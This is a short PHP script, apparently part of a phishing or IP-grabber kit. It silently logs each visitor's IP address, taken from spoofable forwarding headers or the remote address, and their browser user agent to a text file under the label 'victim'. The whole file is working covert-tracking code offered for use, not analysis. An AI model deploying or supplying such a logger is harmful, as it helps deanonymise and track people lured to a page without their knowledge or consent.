<?php
header("Connection: close");

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}

$useragent = "User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";

$fp = fopen($file, 'a');
if (flock($fp, LOCK_EX)) { // Mengunci file sebelum menulis
    fwrite($fp, $victim);
    fwrite($fp, $ipaddress);
    fwrite($fp, $useragent);
    fwrite($fp, $browser);
    flock($fp, LOCK_UN); // Lepaskan kunci
}
fclose($fp);
